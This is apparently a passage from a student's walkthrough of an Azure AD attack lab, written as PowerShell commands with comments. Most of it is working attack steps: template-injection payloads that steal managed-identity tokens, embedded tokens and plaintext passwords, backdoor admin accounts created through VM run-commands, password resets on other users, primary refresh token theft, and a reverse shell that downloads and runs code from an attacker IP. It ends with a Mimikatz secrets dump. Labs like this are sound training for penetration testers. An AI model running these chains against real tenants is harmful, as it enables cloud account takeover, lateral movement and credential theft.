ZTg1NTA5Il0sInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.UX2jLvJ8tYnziH1MMh24Czmfvlcq65XRWEc8QHADtnioTcz18qSJkvhUlnaMJDAX3O3TfpEfku4anin-OviiYM6yN_gxFm9x421w_RPRemK1Dl05wkGz8afWBGUnJFMGCvIYCMWl07YkI_Ky9uPfPy17Z7-eJgatsctK6EnJu7gT7IwJKGbsLXKosaxC_Gt_tUfArmA449DKXb07_ctkXwaafp7meDicnkwnqQ_hdXaVNEfenJO4-yKPiHTx_PVhHYEwWPxNOS6Bk7Y3n1nd_ye9gIKj1OKw8UQ98moZcioAXE6-u9TdOnmqtcEFZZUHPoBfnZbiYMCD0YXaEjWgAA'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graph -AccountId $client_id
Get-AzRoleAssignment -Scope $scope
# if that returns an error, go back and get new access/graph tokens!
# Contributor

## Flag 25 & 26
# 
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
#Import and Publish the Automation Runbook
Import-AzAutomationRunbook -Name artilleryRed -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
Publish-AzAutomationRunbook -RunbookName artilleryRed -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
# start the rev shell
Start-AzAutomationRunbook -RunbookName artilleryRed -RunOn WorkerGroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
# after recieveing your shell, run hostname: defeng-adcsrv

## Flag 27
# Continued from Flag 10
Connect-AzAccount -AccessToken $AccessToken -AccountId $client_id
Get-AzResource
# So we have a VM here, let's dig in! Pull out the Name and ResourceGroup
$resources = Get-AzResource
$name = "bkpadconnect"
$resourceGroup = ($resources | ?{ $_.Name -eq $name }).ResourceGroupName
# Let's see if there are any network restrictions to connect to it
$interface = Get-AzVM -Name $name -ResourceGroupName $resourceGroup | select -ExpandProperty NetworkProfile
# Use a trick to get the last string block of the path
$interfaceName = Split-Path -Path $interface.NetworkInterfaces.Id -Leaf
Get-AzNetworkInterface -Name $interfaceName
# it says it has a public IP address...cool, let's grab that
$ipId = Split-Path -Path (Get-AzNetworkInterface -Name $interfaceName).IpConfigurations.PublicIpAddress.Id -Leaf
# Now grab that public IP
Get-AzPublicIpAddress -Name $ipId
$ipAddress = (Get-AzPublicIpAddress -Name $ipId).IpAddress
# Now let's add our user to the VM with a script. Save in a file the following (make sure the password meets the complexity requirements!:
$passwd = ConvertTo-SecureString "Stud170Password@123" -AsPlainText -Force
New-LocalUser -Name artilleryRed -Password $passwd
Add-LocalGroupMember -Group Administrators -Member artilleryRed
# save that in a file with a PS1 extention and let's upload it
Invoke-AzVMRunCommand -VMName $name -ResourceGroupName $resourceGroup -CommandId 'RunPowerShellScript' -ScriptPath C:\Users\studentuser170\Documents\vmUserAdd.ps1 -Verbose

$passwd = ConvertTo-SecureString "Stud170Password@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('artilleryRed', $passwd)
$vmsess = New-PSSession -ComputerName $ipAddress -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $vmsess
gc C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

## Flag 28
# going from Flag 19
{% for x in ().__class__.__mro__[1].__subclasses__() %}  {% if "Popen" in x.__name__ %}  {{x('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=- 1).communicate()}}  {% endif %} {% endfor %}
{% for x in ().__class__.__mro__[1].__subclasses__() %}  {% if "Popen" in x.__name__ %}  {{x('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=- 1).communicate()}}  {% endif %} {% endfor %}
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY0MzY0NDQ5MCwibmJmIjoxNjQzNjQ0NDkwLCJleHAiOjE2NDM3MzExOTAsImFpbyI6IkUyWmdZTmd0UFRISFZKekI2UnA3OWhPbXJwNkpBQT09IiwiYXBwaWQiOiIyZTkxYTRmZS1hMGYyLTQ2ZWUtODIxNC1mYTJmZjZhYTlhYmMiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHY2a2tTN3lvTzVHZ2hUNkxfYXFtcnh3QUFBLiIsInN1YiI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInV0aSI6IlRXeWJySGNYRTBXNjlkbUM1T0lLQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.BdyA1U8oYFlp07-w2MJJS-H5uF4KUJgr4mHkfk-9uaiLaqUOQk8Y4iEXiKVLGo75-yS6knAOFSXPfrImJ99xLdMtEHHgpYqqW9Xy66i0FXCANqMd2WyLsIrmGYf5gRSjOhpH4h2tsfGVgUzkCCJ_a6kEDwmhOS_gJQrLgUSlFtwMWS6Ps7IQ84QWxeQGF77QgYj0a7BDN_dNVME9nTxIeYJUhE-QDeRW_OZAGG4Z6vEq6NnzG8VwgQTzoHXFNserWxyA84PcyrpVQKldUyosygrzGQRybY831NXNRHB5yEAW9s9cblCNO3Ac8VH0DS0fC2ws9ysGaTZ_FoxfFrQoFw'
$keyvaultToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDM2NDQ0NTcsIm5iZiI6MTY0MzY0NDQ1NywiZXhwIjoxNjQzNzMxMTU3LCJhaW8iOiJFMlpnWU1ndCttZStRMWVUclhucXQ3MHFINTQ5QkFBPSIsImFwcGlkIjoiMmU5MWE0ZmUtYTBmMi00NmVlLTgyMTQtZmEyZmY2YWE5YWJjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0djZra1M3eW9PNUdnaFQ2TF9hcW1yeHdBQUEuIiwic3ViIjoiMzBlNjc3MjctYThiOC00OGQ5LTgzMDMtZjI0NjlkZjk3Y2IyIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiUjdTMml1UGJsRWVBbmhXX01qTUxBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9SZXNlYXJjaC9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy92YXVsdGZyb250ZW5kIn0.EnFDnq_SHdDjX76CERR_tR0RXeiWmW9s_ULZuajbQte3X0GSK22awbwPQvNF9ODVLLnNQr2zTfLVJaHwiDMMh2sUBpkIZY_I-uIaNrdyMqv5FA9eHSHshzZqxaOLnTBrXlrW5wianl8V2GNEsdLGS6H-BmarG44G8aYNma-WW4hQ1OJbGosEhzVBWtPeLvBhYxIuFEB0l5_qPigyvnC-yLd6XjYVBE_QuUSjjvMlJBBCnw4vO9mo_M_Z61GsEbsAmTDSKENj3NpbSEp3Zz64OdWg2X6m56DLb3ady8X5Mlht0QuUsfGI3NNqwW_-1r5E3zAk7K8jeT-u8VLuvIjGaQ'
$client_id = '2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc'
Connect-AzAccount -AccessToken $token -AccountId $client_id -KeyVaultAccessToken $keyvaultToken
Get-AzContext -ListAvailable
Get-AzRoleAssignment
Get-AzResource
# access to the vault. Okay, dig in
# ResearchKeyVault

## Flag 29
# 
Get-AzKeyVault -VaultName ResearchKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault 
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
# got a key for kathy

## Flag 30
#
$passwd = ConvertTo-SecureString "Kathy@3698TEST$#*!@#" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $passwd)
Connect-AzAccount -Credential $creds
Get-AzResource
# apparently 'jumpvm'

## Flag 31
# 
$resourceId = (Get-AzResource | ?{$_.name -eq "jumpvm"}).ResourceId
Get-AzRoleAssignment -Scope $resourceId
$name = (Get-AzRoleAssignment -Scope $resourceId | ?{ $_.DisplayName -eq "VM Admins"}).RoleDefinitionName
# Virtual Machine Command Executor

## Flag 32
# Find the adminstrative Unit
$name | %{ Get-AzRoleDefinition -Name $_}
Get-AzADGroup -DisplayName 'VM Admins'
Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select UserPrincipalName
# grab my token so I can login and grab the users
$token = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$URI = 'https://graph.microsoft.com/v1.0/users/VMContributor170@defcorphq.onmicrosoft.com/memberOf'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{ 'Authorization' = "Bearer $token" }
}
(Invoke-RestMethod @RequestParams).value
# displayName says it is the "Control Group"
# save 'id' for next flag

## Flag 33
# See who is in the above control group (with my creds)
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds
Get-AzureADMSAdministrativeUnit -id e1e26d93-163e-42a2-a46e-1b7d52626395
Get-AzureADMSScopedRoleMembership -Id e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
# So we got a user and an id for Roy G. Cain. What can he do? Use his RoleId below
Get-AzureADDirectoryRole -ObjectId 5b3935ed-b52d-4080-8b05-3a1832194d3a
# after fishing for roygcain, we got his password back: 
$creds = New-Object System.Management.Automation.PSCredential('roygcain@defcorphq.onmicrosoft.com', (ConvertTo-SecureString '$7cur3ceS@!nMoka1679@111' -AsPlainText -Force))
Connect-AzureAD -Credential $creds
# update the password for VMContributor so we can be them!
$password = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText -Force
(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributor170@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $password -Verbose
$creds = New-Object System.Management.Automation.PSCredential('VMContributor170@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds
# see what he can do
Get-azResource
# he can access the jumpvm
$name = 'jumpvm'
$resourceGroup = 'RESEARCH'
Get-AzVM -Name jumpvm -ResourceGroupName $resourceGroup
# Can we get to it? Let's check the IP
Get-AzVM -Name jumpvm -ResourceGroupName $resourceGroup | select -ExpandProperty NetworkProfile
$networkProfile = (Get-AzVm -Name jumpvm -ResourceGroupName $resourceGroup | select -ExpandProperty NetworkProfile).NetworkInterfaces.Id
Get-AzNetworkInterface -Name $(Split-Path $networkProfile -Leaf)
Get-AzPublicIpAddress -Name jumpvm-ip
# IP is 51.116.180.87
Invoke-AzVMRunCommand -ScriptPath C:\AzAD\Tools\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'jumpvm' -ResourceGroupName $resourceGroup -Verbose
# Now I should be able to logon with what I put in my script!
$creds = New-Object System.Management.Automation.PSCredential('student170', (ConvertTo-SecureString "Stud170Password@123" -AsPlainText -Force))
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm
exit

## Flag 34
# continuation from flag 20
# grab a new token from the virusscanner and do the "AddSecret" command again
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDM2ODQ3NTksIm5iZiI6MTY0MzY4NDc1OSwiZXhwIjoxNjQzNzcxNDU5LCJhaW8iOiJFMlpnWURpem1qdFF2TW52MEhkWndYVWZCT1llQVFBPSIsImFwcGlkIjoiNjJlNDQ0MjYtNWM0Ni00ZTNjLThhODktZjQ2MWQ1ZDU4NmYyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRrWklmM2tBdXRkUHVrUGF3ZmoyTUJOd0FBQS4iLCJzdWIiOiJlYTRjM2MxNy04YTVkLTRlMWYtOTU3Ny1iMjlkZmZmMDczMGMiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiI3U1RldDZKSW5FT3Z1eFo5MzZFTEFBIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0lUL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL3Byb2Nlc3NmaWxlIiwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.inod_WlfyFaWHvHn6nV8omwF71jCGtUvahR1YhjvURQPfgFP-rZDiOO1deec1VRnuKxcXKReJbOpzMe43-4OPWuKYBiLKmV3FVFWX8P988b1kGRdZ3AEAiDCvzF2mQzaOTrPKC1Iru0g7b1R4pN5iP0LoXoFE5xLLbjTjLyhCJzMHcTEKXwvYYD-BGVz_vcsAJF9EvfY3SL6y-6bTaPouKqcF4OLMTj3HHqBilz6fPIrhl0BpOqzJVNVVHC19YVZELO7IufQaQH4QtRAlXSkvaSRe87nCcov69ZrKC6u0Q2j21QGEw5PHhWU8Tb3YxcnkFDF8qSK05cSCB0fFFc7jw'
$client_id = '62e44426-5c46-4e3c-8a89-f461d5d586f2'
$graph_token = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6Ijlta1lEUkRxTzFzcE55UGxxY1Rub3BKVWdjTDNZcFMxWUNzYklKek14QlUiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY0MzY4NDc2MCwibmJmIjoxNjQzNjg0NzYwLCJleHAiOjE2NDM3NzE0NjAsImFpbyI6IkUyWmdZT2orY3lleXZlNkxyZWkwdnFRbCt5WWtBQUE9IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0Z01BQUFBQUFBQUF3QUFBQUFBQUFBQndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiZUNsbHM4S0dQMHFLTWJadHN4a0tBQSIsInZlciI6IjEuMCIsIndpZHMiOlsiMDk5N2ExZDAtMGQxZC00YWNiLWI0MDgtZDVjYTczMTIxZTkwIl0sInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.rD20r28sr2dxZIbzTbvv45tbra0OYsCGLsQ8IHMgaKPHAdKyisl_vb86nARWOXWt9Cm6LlTsRPYFsGX89zg7EzXBzl81K6wgkU-UDes-E42Dd2KdtHv1XnlLEyMXq_bMpkI09o5t0gD00hVpi3ycAxDwKXKrlGVVCCnMYqRtD8SOe43c4kEVxC3Zrnn_lIEHy2cdabbqyOKgi8C7Pj3v7nro29rKC-gF8O0vDYskoZXdmHoB1f93K6pScMn75vPZZ3_k7f0NutWJiV83hb_varVzG8Re9O9G2gc4scIcFuW4eog8XbiT7ArRQZcBWOD2lYk88RzGKyVLF7DsI7TZHQ'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graph_token -AccountId $client_id
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
   Method = 'GET'
   Uri = $URI
   Headers = @{
    'Authorization' = "Bearer $graph_token"
   }
}
(Invoke-RestMethod @RequestParams).value
. C:\AzAD\Tools\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graph_token -Verbose
# save the secret we got added and the AppId
$appId = 'f072c4a6-b440-40de-983f-a7f3bd317d8f'
$secret = 'sCA7Q~Y12CkAgC6vQ1pQhvJmgVw5844lIH27g'
# And let's log in as the app!
$creds = New-Object System.Management.Automation.PSCredential($appId, (ConvertTo-SecureString $secret -AsPlainText -Force))
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
Get-AzResource
Get-AzKeyVaultSecret -VaultName credvault-fileapp
Get-AzKeyVaultSecret -VaultName credvault-fileapp -Name MobileUsersBackup -AsPlainText
# and there we get David and his password username: DavidDHenriques@defcorphq.onmicrosoft.com ; password: David@Ka%%ya72&*FG9313gs49

## Flag 40
# continuing from Flag 33
Enter-PSSession -Session $jumpvm
# Now pull any userdata available
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
# and we just pulled creds samcgray@defcorphq.onmicrosoft.com:$7cur7gr@yQamu1913@013
exit

## Flag 41 & 42
$Password = ConvertTo-SecureString '$7cur7gr@yQamu1913@013' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('samcgray@defcorphq.onmicrosoft.com', $Password)
Connect-AzAccount -Credential $Cred
Get-AzResource
$resourceId = (Get-AzResource | ?{ $_.Name -match "ExecCmd"}).ResourceId
Get-AzRoleAssignment -SignInName samcgray@defcorphq.onmicrosoft.com
# that returned nothing, so let's do it the hard way
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{ 'Authorization' = "Bearer $Token" }
}
(Invoke-RestMethod @RequestParams).value
# we got read and write! Let's add us a user to this vm
Get-AzVMExtension -ResourceGroupName $resourceGroup -VMName "infradminsrv"
Set-AzVMExtension -ResourceGroupName $resourceGroup -ExtensionName "ExecCmd" -VmName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users artilleryRed Student170Password@123 /add /Y; net localgroup administrators artilleryRed /add"}'
# If it worked, we should be able to log on to the jumpvm and get access to the infradminsrv
$creds = New-Object System.Management.Automation.PSCredential('student170', (ConvertTo-SecureString "Stud170Password@123" -AsPlainText -Force))
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm
$creds = New-Object System.Management.Automation.PSCredential('.\artilleryRed', (ConvertTo-SecureString "Student170Password@123" -AsPlainText -Force))
# Remember this is a local account, not a domain account so it has to have the .\ in front of the user name! kicked my ass for about an hour!
$infravm = New-PSSession -ComputerName 10.0.1.5 -Credential $creds
Invoke-Command -Session $infravm -ScriptBlock{hostname}
# So this machine is joined to Azure. perfect
Invoke-Command -Session $infravm -ScriptBlock{dsregcmd /status}
# So this machine is joined to Azure. perfect
# Copy over ROADToken.exe and PSExec64 so we can do a PRT attack!
exit
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\Users\student170\Documents
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PsExec64.exe -Destination C:\Users\student170\Documents
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\student170\Documents
Enter-PSSession $jumpvm
Invoke-Command -Session $infravm -ScriptBlock{pwd}
Invoke-Command -Session $infravm -ScriptBlock{ mkdir C:\temp }
Copy-Item -ToSession $infravm -Path C:\Users\student170\Documents\PsExec64.exe -Destination C:\temp
Copy-Item -ToSession $infravm -Path C:\Users\student170\Documents\ROADToken.exe -Destination C:\temp
Copy-Item -ToSession $infravm -Path C:\Users\student170\Documents\SessionExecCommand.exe -Destination C:\temp
# Now execute it
$tenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
$URL = "https://login.microsoftonline.com/$tenantId/oauth2/token"
$Params = @{
    "URI" = $URL
    "Method" = "POST"
}
$Body = @{
    "grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
Invoke-Command -Session $infravm -ScriptBlock{$arg = " /c C:\temp\SessionExecCommand.exe MichaelMBarron C:\temp\ROADToken.exe AwABAAAAAAACAOz_BAD0_2_5WNIvi2oywYm6tyh-Ds4DF0x86lkzDX4IHRJpAPjT7atDgHNmgP7PVhifhCFYSQL09VEJlZZyA3_oRvl5dKEgAA > C:\temp\PRT.txt"}
Invoke-Command -Session $infravm -ScriptBlock{C:\temp\PsExec64.exe -accepteula -s "cmd.exe" $arg}
# has errors, but it executed!
Invoke-Command -Session $infravm -ScriptBlock{ gc C:\temp\PRT.txt }
exit
# cookie created for michaelmbarron for cookie: x-ms-RefreshTokenCredential
# Now in the browser, open an incognito window and go to login.microsoftonline.com
# Clear all your cookies and add this one. Select the HttpOnly and Secure checkboxes as well
# update the bar to go to login.microsoftonline.com/login.srf
# if it doesn't work, generate more tokens!

## Flag 43
# 
# Looking through what Barron can do, go to "https://endpoint.microsoft.com" and he is in the InTune group
# Clicking on devices, there are 2 devices enrolled. If we click on Scripts, there are scripts available to be added to a device
# If we run a script that adds a user to that device, it gets added. So after that script is run on the device, we should have access.
$creds = New-Object System.Management.Automation.PSCredential('student170', (ConvertTo-SecureString "Stud170Password@123" -AsPlainText -Force))
$onPrem = New-PSSession -ComputerName 172.16.2.24 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $onPrem
# now that we are on the box, lets look around
whoami
gci -Recurse -Force -Path . ConsoleHost_history.txt -ErrorAction SilentlyContinue
# nothing there, keep looking
gci C:\
gci C:\Transcripts
gci C:\Transcripts\20210422
gc C:\Transcripts\20210422\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
#PS C:\Users\defres-adminsrv> $Password = ConvertTo-SecureString 'UserIntendedToManageSyncWithCl0ud!' -AsPlainText -Force
#$Cred = New-Object System.Management.Automation.PSCredential('adconnectadmin', $Password)
#Enter-PSSession -ComputerName defres-adcnct -Credential $Cred
# Let's grab the IP of the desres-adcnct
ping -n 1 defres-adcnct
# Its an IPv6 link local address

## Flag 45
# continuing from Flag 36 - we have creds for thomasebarlow@defcorpit.onmicrosoft.com: %%Thomas^Da@asyu0(@*&13563
# Go to portal.azure.com and log-in
# Thomas doesn't have access to much at all. Looking around, he is part of the "ITOPS" group and it has dynamic membership rules
# We can add our user to this group by modifying the permissions. Go watch Lab Video 22!
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
$domain = "defcorpit.onmicrosoft.com"
$tenant = Get-AADIntTenantId -Domain $domain
# Now update our user object to match what the Dynamic membership requires
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$creds = New-Object System.Management.Automation.PSCredential('thomasebarlow@defcorpit.onmicrosoft.com', (ConvertTo-SecureString "%%Thomas^Da@asyu0(@*&13563" -AsPlainText -Force))
Connect-AzureAD -Credential $creds
$objectId = (Get-AzureADUser -SearchString "student 170").ObjectId
# Now log in as the user to update his properties to get him in the dynamic membership!
$creds = New-Object System.Management.Automation.PSCredential('student170@defcorpextcontractors.onmicrosoft.com', (ConvertTo-SecureString "HzyXYxn28ayRCN6F" -AsPlainText -Force))
Connect-AzureAD -Credential $creds -TenantId $tenant
Set-AzureADUser -ObjectId $objectId -OtherMails "vendor170@defcorpextcontractors.onmicrosoft.com" -Verbose

## Flag 46
# continuation of Flag 37
# So we were able to add the user with CreateUser
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
$domain = "defcorphq.onmicrosoft.com"
$tenant = Get-AADIntTenantId -Domain $domain
$creds = New-Object System.Management.Automation.PSCredential('student170@defcorphq.onmicrosoft.com', (ConvertTo-SecureString "Stud170Password@123" -AsPlainText -Force))
Connect-AzureAD -Credential $creds -TenantId $tenant
# Since we are in the Application area, let's see if any proxies are in effect
Get-AzureADApplication
Get-AzureADApplication | %{try{ Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID; $_.DisplayName;$_.ObjectID} catch{}}
# So we have fms-defcorphq.msappproxy.net that goes to http://deffin-appproxy.
$objectId = (Get-AzureADApplication | ?{ $_.DisplayName -eq "Finance Management System"}).ObjectId
# Let's find the service prinipal associated with this service
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}
# Save that objectId
$SPNObjectId = (Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}).ObjectId
. C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId $SPNObjectId
# It says someone I control "student170" has access to it. Let's go login to the application
# https://fms-defcorphq.msappproxy.net
# and this application has a flaw and allows you to upload files in the Config section
# after putting in a webshell, let's get a revshell!
cmd=powershell iex(New-Object Net.WebClient).downloadstring('http://172.16.151.170:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.151.170 -Port 4446
# Looking around, there aren't any powershell transcripts. Since we are NT authority, let's dump with mimikatz
iex(New-Object net.Webclient).DownloadString('http://172.16.151.170:82/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
# that dumped a bunch. Here is a unique one:
#Secret  : _SC_SNMPTRAP / service 'SNMPTRAP' with username : adfsadmin@deffin.com
#cur/text: UserToCreateandManageF3deration!
#old/text: UserToCreateandManageF3deration!

## Flag 47
